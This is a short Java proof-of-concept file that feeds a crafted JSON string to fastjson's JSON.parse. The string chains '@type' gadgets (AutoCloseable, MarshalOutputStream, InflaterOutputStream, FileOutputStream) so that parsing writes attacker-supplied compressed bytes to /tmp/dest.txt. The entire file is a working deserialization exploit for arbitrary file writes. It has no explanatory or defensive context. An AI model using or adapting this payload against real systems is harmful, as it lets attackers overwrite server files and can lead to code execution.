import com.alibaba.fastjson.JSON;

import java.io.FileNotFoundException;
public class fastjson_JRE {
    public static void main(String[] args) throws FileNotFoundException {
        String payload="{\n" +
                "    \"x\":{\n" +
                "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "    \"input\":{\n" +
                "        \"@type\":\"java.lang.AutoCloseable\",\n" +
                "        \"@type\":\"sun.rmi.server.MarshalOutputStream\",\n" +
                "        \"out\":{\n" +
                "            \"@type\":\"java.util.zip.InflaterOutputStream\",\n" +
                "            \"out\":{\n" +
                "                \"@type\":\"java.io.FileOutputStream\",\n" +
                "                \"file\":\"/tmp/dest.txt\",\n" +
                "                \"append\":false\n" +
                "            },\n" +
                "            \"infl\":{\n" +
                "                \"input\":\"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"\n" +
                "            },\n" +
                "            \"bufLen\":1048576\n" +
                "        },\n" +
                "        \"protocolVersion\":1\n" +
                "    }\n" +
                "  }\n" +
                "}";
        Object exp =(Object) JSON.parse(payload);
    }
}
